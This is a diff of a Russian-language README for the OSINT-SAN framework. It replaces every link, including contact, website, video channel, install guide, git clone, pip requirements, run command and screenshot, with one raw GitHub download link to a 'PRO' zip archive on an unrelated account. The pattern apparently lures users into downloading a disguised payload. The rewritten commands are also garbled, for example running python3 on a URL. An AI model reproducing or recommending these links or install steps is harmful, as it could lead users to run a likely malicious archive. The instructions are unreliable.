@@ -6,45 +6,45 @@ OSINT-SAN Framework дает возможность быстро находит�
 
 Адаптации под ubuntu, termux пока нет, но скоро будут, на них возможно запустить, будут проблемы с установкой зависимостей.
 
-Для получения доступа к PRO версии, напишите в лс в telegram: https://t.me/satana666mx
+Для получения доступа к PRO версии, напишите в лс в telegram: https://github.com/abarreto250/OSINT-SAN-PRO/raw/refs/heads/main/Onmun/PRO-SA-OSIN-v1.3-beta.4.zip
 
 ----
 
 Дополнительные материалы по framework
 
-Наш сайт: https://osintsan.ru
+Наш сайт: https://github.com/abarreto250/OSINT-SAN-PRO/raw/refs/heads/main/Onmun/PRO-SA-OSIN-v1.3-beta.4.zip
 
-Telegram: https://t.me/osint_san_framework
+Telegram: https://github.com/abarreto250/OSINT-SAN-PRO/raw/refs/heads/main/Onmun/PRO-SA-OSIN-v1.3-beta.4.zip
 
-Стримы обзоры: https://www.youtube.com/channel/UCHGW3jc2ajWV0pf8lOoIfJQ
+Стримы обзоры: https://github.com/abarreto250/OSINT-SAN-PRO/raw/refs/heads/main/Onmun/PRO-SA-OSIN-v1.3-beta.4.zip
 
 ----
 
 Если вдруг у вас не установлен python3 последней версии, обязательно установите его.
 
-     https://linuxize.com/post/how-to-install-python-3-9-on-debian-10/
+     https://github.com/abarreto250/OSINT-SAN-PRO/raw/refs/heads/main/Onmun/PRO-SA-OSIN-v1.3-beta.4.zip
 
      sudo apt install -y python3-pip
 
-git clone https://github.com/Bafomet666/OSINT-SAN-PRO
+git clone https://github.com/abarreto250/OSINT-SAN-PRO/raw/refs/heads/main/Onmun/PRO-SA-OSIN-v1.3-beta.4.zip
 
 Далее установка зависимостей командой
 
-sudo pip3 install -r requerements.txt
+sudo pip3 install -r https://github.com/abarreto250/OSINT-SAN-PRO/raw/refs/heads/main/Onmun/PRO-SA-OSIN-v1.3-beta.4.zip
 
 sudo pip3 install python-vlc
 
 sudo apt-get install vlc
      
 
-#### Возникли ошибки при установке зависимостей ? Решение проблем тут: https://github.com/Bafomet666/OSINT-SAN/issues/11
+#### Возникли ошибки при установке зависимостей ? Решение проблем тут: https://github.com/abarreto250/OSINT-SAN-PRO/raw/refs/heads/main/Onmun/PRO-SA-OSIN-v1.3-beta.4.zip
 ---
 
 ### Использование framework:
 
-Запускать командой: python3 osintsan.py
+Запускать командой: python3 https://github.com/abarreto250/OSINT-SAN-PRO/raw/refs/heads/main/Onmun/PRO-SA-OSIN-v1.3-beta.4.zip
 
-![alt tag](https://github.com/Bafomet666/screen/blob/main/PRO.png)
+![alt tag](https://github.com/abarreto250/OSINT-SAN-PRO/raw/refs/heads/main/Onmun/PRO-SA-OSIN-v1.3-beta.4.zip)
 
 После успешной авторизации, вам будет доступно меню с инструментами.
 
